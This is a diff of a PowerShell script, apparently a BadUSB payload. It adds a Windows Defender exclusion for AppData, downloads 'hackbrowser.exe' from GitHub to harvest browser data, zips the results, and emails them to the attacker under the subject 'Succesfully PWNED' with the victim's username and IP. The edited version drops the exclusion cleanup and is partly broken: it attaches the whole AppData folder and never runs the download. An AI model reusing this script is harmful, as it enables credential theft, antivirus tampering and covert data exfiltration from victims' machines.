@@ -1,11 +1,11 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
+mkdir "$env:appdata"
+Set-Location "$env:appdata"
 #Downloading and executing hackbrowser.exe
-$down = New-Object System.Net.WebClient; $url = 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe'; $file = 'hb.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file)
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
+Remove-Item -Path "$env:appdata\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
@@ -21,11 +21,10 @@ $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$Message.Attachments.Add("$env:appdata")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
+
